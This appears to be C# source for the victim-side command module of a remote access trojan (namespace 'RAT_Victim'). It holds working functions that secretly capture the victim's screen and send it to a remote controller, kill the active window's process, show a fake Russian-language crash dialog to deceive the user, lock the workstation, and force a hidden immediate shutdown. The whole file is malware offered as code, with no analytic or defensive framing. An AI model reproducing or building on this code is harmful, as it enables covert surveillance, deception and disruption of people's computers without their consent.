using System.Diagnostics;
using System.Diagnostics.CodeAnalysis;
using System.Drawing;
using System.Text;
using System.Windows.Forms;

#pragma warning disable IDE0051 // Remove unused private members

namespace RAT_Victim
{
    [SuppressMessage("ReSharper", "UnusedMember.Local")]
    internal static class Commands
    {
        private static readonly ImageConverter Converter = new ImageConverter();

        private static void CloseActiveWindow()
        {
            var window = PInvoke.GetForegroundWindow();
            PInvoke.GetWindowThreadProcessId(window, out var processId);
            var process = PInvoke.OpenProcess(1, true, processId);
            PInvoke.TerminateProcess(process, 0);
        }

        private static void ShowMessageBox()
        {
            var window = PInvoke.GetForegroundWindow();
            PInvoke.MessageBox(window,
                "Ошибка при запуске приложения (0xc0000005). Для выхода из приложения нажмите кнопку \"OK\".",
                GetActiveWindowTitle() + " - Ошибка приложения", 0x10);
        }

        private static void TakeScreenshot()
        {
            var screenSize = Screen.PrimaryScreen.Bounds.Size;
            var bitmap = new Bitmap(screenSize.Width, screenSize.Height);
            var graphics = Graphics.FromImage(bitmap);
            graphics.CopyFromScreen(0, 0, 0, 0, bitmap.Size);
            var data = (byte[])Converter.ConvertTo(bitmap, typeof(byte[]));
            if (data != null) Program.Client.Send(data);
        }

        private static void Lock()
        {
            PInvoke.LockWorkStation();
        }

        private static void Shutdown()
        {
            var process = new Process
            {
                StartInfo = new ProcessStartInfo("cmd", "/C shutdown /s /t 0")
                { WindowStyle = ProcessWindowStyle.Hidden }
            };
            process.Start();
        }

        private static string GetActiveWindowTitle()
        {
            var window = PInvoke.GetForegroundWindow();
            var builder = new StringBuilder();
            PInvoke.GetWindowText(window, builder, builder.MaxCapacity);
            return builder.ToString();
        }

        public static void ShowMessage(string message)
        {
            PInvoke.MessageBox(PInvoke.GetForegroundWindow(), message, GetActiveWindowTitle(), 0x40);
        }
    }
}
